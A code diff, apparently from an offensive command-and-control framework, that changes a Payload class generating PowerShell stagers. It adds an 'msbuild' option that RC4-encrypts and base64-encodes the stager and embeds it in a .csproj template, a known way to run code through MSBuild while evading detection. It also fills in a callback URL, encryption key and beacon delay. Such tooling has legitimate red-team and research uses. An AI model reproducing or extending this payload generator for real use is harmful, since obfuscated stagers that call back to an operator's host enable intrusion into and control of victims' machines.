@@ -6,8 +6,9 @@
 """
 
 import os
+import base64
 from core.utils import Utils
-
+from core.rc4 import RC4
 
 class Payload:
 
@@ -17,13 +18,14 @@ class Payload:
     def __init__(self, config):
         self.config = config
         self.type = {}
-        self.type['ps'] = 'stager.ps1'
+        self.type["ps"] = "stager.ps1"
 
         # self.type["js"] = "stager.ps1"
         # self.type["hta"] = "stager.ps1"
 
-        self.type['exe'] = '../bin/stager.cs'
-        self.type['cs'] = '../bin/stager.cs'
+        self.type["exe"] = "../bin/stager.cs"
+        self.type["cs"] = "../bin/stager.cs"
+        self.type["msbuild"] = "stager.ps1"
 
         self.delay = Payload.DEFAULT_DELAY
         self.option = Payload.DEFAULT_TYPE
@@ -39,14 +41,17 @@ class Payload:
             self.delay = Payload.DEFAULT_DELAY
 
     def get_output(self):
-        output = Utils.load_powershell_script(self.type[self.option], 200)
+        output = Utils.load_powershell_script(self.type[self.option], 999)
         output = output.replace('[URL]', self.get_url()).replace('[KEY]', self.config.get('encryption-key')).replace('[DELAY]', str(self.delay))
-        if self.option == 'exe':
+        
+        if self.option == "exe":
             output = self.compile_exe(output)
+        if self.option == "msbuild":
+            output = self.generate_msbuild(output)
         return output
 
     def compile_exe(self, data):
-        output = ''
+        output = ""
         filename = '/tmp/%s' % Utils.gen_str(10)
         open(filename, 'wb+').write(data)
         cmdline = \
@@ -60,10 +65,13 @@ class Payload:
 
         return output
 
+    def generate_msbuild(self, ps):
+        msbuild = Utils.load_powershell_script("../bin/stager.csproj", 999)
+        rc4_key = RC4.gen_rc4_key(32)
+        hex_rc4_key = RC4.format_rc4_key(rc4_key)
+        rc4 = RC4(rc4_key)
+        data = base64.b64encode(rc4.crypt(ps))
+        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key)
+
     def get_url(self):
-        url = 'http://'
-        if self.config.get('https-enabled') == 'on':
-            url = 'https://'
-        url += '%s/' % (self.config.get('payload-callback'))
-        self.config.set('payload-callback', "%s:%s" % (self.config.get('http-fqdn'), self.config.get('http-port')))
-        return url
+        return self.config.get("callback-url")
